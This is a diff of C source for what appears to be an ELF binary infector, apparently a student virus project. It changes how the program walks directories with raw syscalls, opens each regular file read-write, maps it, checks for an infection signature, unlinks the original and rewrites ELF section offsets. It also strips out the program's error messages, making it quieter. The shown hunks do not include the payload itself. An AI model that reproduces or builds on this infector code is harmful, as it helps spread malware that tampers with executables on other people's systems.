@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/05/22 21:17:01 by root              #+#    #+#             */
-/*   Updated: 2018/05/30 06:42:16 by root             ###   ########.fr       */
+/*   Updated: 2018/05/31 04:10:02 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -70,9 +70,10 @@ void	find_files(char *dir)
 		off = 0;
 		while (off < ret)
 		{
-			if (*(buff + off + 8+8+2) == DT_REG)
-				get_dat_elf(dir, buff + off + 8+8+2+1);
-			off = off + *(buff + off + 16);
+			struct linux_dirent64 *linux64 = (struct linux_dirent64 *)(buff + off);
+			if (linux64->d_type == DT_REG)
+				get_dat_elf(dir, linux64->d_name);
+			off += linux64->d_reclen;
 		}
 	}
 	syscall(CLOSE, fd);
@@ -101,14 +102,11 @@ void	get_dat_elf(char *dir, char *file)
 	}
 	path[i + j] = '\0';
 	fd = syscall(OPEN, path, O_RDWR|O_NONBLOCK, 0);
-	if (fd == -1){
-		write(1, "OPEN file failed\n", 17);
+	if (fd == -1)
 		return ;
-	}
 	size = syscall(LSEEK, fd, 1, SEEK_END);
 	if (size <= 0)
 	{
-		write(1, "SEEK file failed\n", 17);
 		syscall(CLOSE, fd);
 		return ;
 	}
@@ -116,7 +114,6 @@ void	get_dat_elf(char *dir, char *file)
 	data = (void *)syscall(MMAP, NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
 	if (data == MAP_FAILED)
 	{
-		write(1, "MMAP file failed\n", 17);
 		syscall(CLOSE, fd);
 		return ;
 	}
@@ -149,9 +146,8 @@ void		pack_dat_elf(char *path, int size, char *data)
 		if (check_signature(data, iprogram))
 			return ;
 
-		/* Extra: Change the offset of sections higher than our code offset, for debug. */
 		syscall(UNLINK, path);
-
+		/* Extra: Change the offset of sections higher than our code offset, for debug. */
 		size_t	shoff = ((Elf64_Ehdr *)data)->e_shoff;
 		Elf64_Shdr *section = (Elf64_Shdr *)(data + shoff);
 		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_shnum; i++) {
